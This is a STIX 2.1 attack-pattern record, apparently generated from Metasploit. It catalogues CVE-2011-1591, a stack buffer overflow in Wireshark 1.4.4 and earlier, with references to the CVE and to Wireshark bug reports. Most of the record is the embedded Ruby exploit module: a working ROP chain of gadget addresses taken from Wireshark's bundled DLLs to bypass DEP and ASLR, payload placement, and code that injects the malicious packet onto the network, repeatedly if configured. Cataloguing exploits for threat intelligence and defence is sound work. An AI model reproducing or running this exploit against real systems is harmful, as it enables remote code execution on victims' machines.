{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--75587b3b-22ca-437a-8a9f-42011ba791f6",
    "created": "2024-08-14T16:46:37.975599Z",
    "modified": "2024-08-14T16:46:37.975603Z",
    "name": "Wireshark packet-dect.c Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Wireshark <= 1.4.4 by sending a malicious packet.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/wireshark_packet_dect.rb",
            "external_id": "wireshark_packet_dect.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1591"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5838"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5836"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Capture\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wireshark packet-dect.c Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Wireshark <= 1.4.4\n        by sending a malicious packet.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Paul Makowski',  #Initial discovery\n          'sickness',       #proof of concept\n          'corelanc0d3r <peter.ve[at]corelan.be>',   #rop exploit + msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-1591'],\n          [ 'OSVDB', '71848'],\n          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5838' ],\n          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5836' ],\n          [ 'EDB', '17185' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 936,\n          'DisableNops' => 'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Win32 Universal (Generic DEP & ASLR Bypass)',\n            {\n              'OffSet' => 1243,\n              'Ret'    => 0x667c484d, #libgnutl pivot - tx Lincoln\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-18',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptBool.new('LOOP', [true,  'Send the packet every X seconds until the job is killed', false]),\n      OptInt.new('DELAY', [true,  'This option sets the delay between sent packets', 5])\n    ])\n\n    register_advanced_options([\n      OptBool.new(\"ExitOnSession\", [ false, \"Return from the exploit after a session has been created\", true ]),\n\n    ])\n\n    deregister_options('FILTER','PCAPFILE','RHOSTS','SNAPLEN','TIMEOUT','SECRET','GATEWAY_PROBE_HOST','GATEWAY_PROBE_PORT')\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n    check_pcaprub_loaded # Check first\n\n    ptype = \"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x23\\x23\"\n\n    print_status(\"Preparing payload\")\n\n    pivot = [target.ret].pack('V')\n\n    # pvefindaddr rop 'n roll\n    # tx dadr00p (https://twitter.com/dietersar) for testing the offsets below\n    rop_pivot =\n    [\n      0x618d7d0e,     # RET\n      0x618d7d0e,     # RET\n      0x618d7d0e,     # RET\n      0x64f9d5ec,     # ADD ESP,0C # RET - libfontconfig-1.dll\n      0x618d7d0e,     # RET <- don't count on this one !\n      0x618d7d0e,     # RET\n      0x618d7d0e,     # RET\n      0x618d7d0e,     # RET\n      0x61C14268,     # ADD ESP,24 # RETN - freetype6.dll\n      0xFFFFFFFF,     # crash baby !\n      0xFFFFFFFF,\n      0xFFFFFFFF,\n      0xFFFFFFFF,\n      0xFFFFFFFF,\n      0x618d7d0e,\n      0x618d7d0e,\n      0x618d7d0e,\n      0x618d7d0e,\n    ].pack(\"V*\")\n\n    rop_gadgets =\n    [\n      0x6d7155cb,     # PUSH ESP # POP EBX # POP EBP # RETN  **[libpangoft2-1.0-0.dll]\n      junk,\n      0x6d596e31,     # MOV EAX,EBX # POP EBX # POP EBP # RETN  **[libgio-2.0-0.dll]\n      junk,\n      junk,\n      0x61c14552,     # POP EBX # RETN    ** [freetype6.dll]\n      0x00000800,     # size - 0x800 should be more than enough\n      0x61c14043,     # POP ESI # RETN    ** [freetype6.dll]\n      0x0000009C,\n      0x6d58321a,     # ADD EAX,ESI # POP ESI # POP EBP # RETN    **[libgio-2.0-0.dll]\n      junk,\n      junk,\n      0x68610a27,     # XCHG EAX,EBP # RETN    ** [libglib-2.0-0.dll]\n      0x629445a6,     # POP EAX # RETN    ** [libatk-1.0-0.dll]\n      0x62d9027c,     #\n      0x6c385913,     # MOV EAX,DWORD PTR DS:[EAX] # ADD CL,CL # RETN  ** [libgdk-win32-2.0-0.dll]\n      0x617bc526,     # XCHG EAX,ESI # ADD AL,10 # ADD CL,CL # RETN    ** [libgtk-win32-2.0-0.dll]\n      0x64f8c692,     # POP EDX # RETN    ** [libfontconfig-1.dll]\n      0x00000040,     #\n      0x619638db,     # POP ECX # RETN    ** [libgtk-win32-2.0-0.dll]\n      0x6536B010,     # RW\n      0x618d7d0d,     # POP EDI # RETN    ** [libgtk-win32-2.0-0.dll]\n      0x618d7d0e,     # RET\n      0x64fa0c15,     # POP EAX # RETN    ** [libfontconfig-1.dll]\n      0x618d7d0e,     # RET\n      0x61963fdb,     # PUSHAD # RETN     ** [libgtk-win32-2.0-0.dll]\n    ].pack(\"V*\")\n\n    pivot = [target.ret].pack('V')\n\n    buffer = rand_text(131)\n    buffer << rop_pivot\n    buffer << rop_gadgets\n\n    nops = make_nops(target['OffSet'] - (buffer.length) - (payload.encoded.length))\n\n    buffer << nops\n    buffer << payload.encoded\n    buffer << pivot\n\n    filler = 1500 - buffer.length\n\n    buffer << rand_text(filler)\n\n    pkt = ptype\n    pkt << buffer\n\n    print_status(\"Sending malicious packet\")\n    open_pcap()\n\n    #handler\n    if datastore['LOOP']\n      while true\n        break if session_created? and datastore['ExitOnSession']\n        inject(pkt)\n        select(nil,nil,nil,datastore['DELAY'])\n      end\n    else\n      inject(pkt)\n    end\n\n    close_pcap\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-18",
    "x_mitre_platforms": [
        "win'"
    ]
}